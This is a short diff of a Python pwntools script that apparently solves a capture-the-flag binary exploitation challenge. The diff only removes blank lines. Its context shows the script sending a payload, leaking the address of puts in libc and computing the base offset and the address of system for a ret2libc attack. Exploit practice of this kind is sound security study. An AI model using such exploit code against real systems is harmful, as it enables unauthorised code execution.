@@ -58,7 +58,6 @@ def main():
     rep = r.recvuntil(b'Good luck ;)\n')
     print(rep)
 
-
     r.send(payload)
 
     rep = r.recv()
@@ -68,7 +67,6 @@ def main():
         log.success("Leak puts@libc : " + hex(u64(leak)))
     except:
         exit(0)
-
 
     offset = u64(leak) - puts_libc
     sys = offset + sys_libc
